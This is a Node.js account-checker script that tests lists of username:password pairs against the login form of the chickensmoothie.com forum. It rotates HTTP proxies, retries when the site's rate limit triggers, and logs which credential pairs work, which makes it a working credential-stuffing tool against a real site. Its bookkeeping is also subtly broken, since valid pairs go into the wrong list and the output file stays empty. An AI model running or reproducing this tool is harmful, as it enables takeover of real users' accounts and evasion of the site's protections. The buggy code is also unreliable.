"use strict";

// Dependencies
const request = require("request-async")
const dialogy = require("dialogy")
const _ = require("lodash")
const fs = require("fs")

// Variables
const args = process.argv.slice(2)
const validAccounts = []
var accounts;
var max = 0

// Function
async function check(username, password, proxy){
    try{
        var response = await request.post("https://www.chickensmoothie.com/Forum/ucp.php?mode=login", {
            timeout: 6000,
            proxy: `http://${proxy}`,
            headers: {
                "content-type": "application/x-www-form-urlencoded"
            },
            body: `username=${username}&password=${password}&viewonline=on&redirect=.%252Fucp.php%253Fmode%253Dlogin&sid=9ab6047e94b1f0a81cb61b67069e36dc&redirect=index.php&login=Login`
        })

        response = response.body

        if(response.match("You have specified an incorrect")){
            console.log(`Invalid ${username}:${password}`)
            max++
        }else if(response.match("You exceeded the maximum allowed number of")){
            setTimeout(()=>{
                check(username, password, proxy)
            }, 4000)
        }else{
            if(!accounts.includes(`${username}:${password}`)){
                max++
                console.log(`Valid ${username}:${password}`)
                accounts.push(`${username}:${password}`)
                fs.writeFileSync(args[1], validAccounts.join("\n"), "utf8")
            }
        }

        if(max === accounts.length){
            console.log("Finished.")
            process.exit()
        }
    }catch(err){
        check(username, password, proxy)
    }
}

// Main
if(!args.length) return console.log("usage: node index.js <inputFile> <outputFile>")
if(!args[1]) return console.log("Invalid outputFile.")

accounts = _.uniq(fs.readFileSync(args[0], "utf8").split("\n"))

console.log(`${accounts.length} accounts found.`)
console.log("Please select your HTTP proxies file.")
var proxiesFilePath = dialogy.openFile({
    filter: {
        patterns: ["*.txt"],
        description: ".txt"
    }
})

const proxies = fs.readFileSync(proxiesFilePath, "utf8").split("\n")

console.log("Checking has started, please wait...")
for( const account of accounts ) check(account.split(":")[0], account.split(":")[1], proxies[Math.floor(Math.random() * proxies.length)])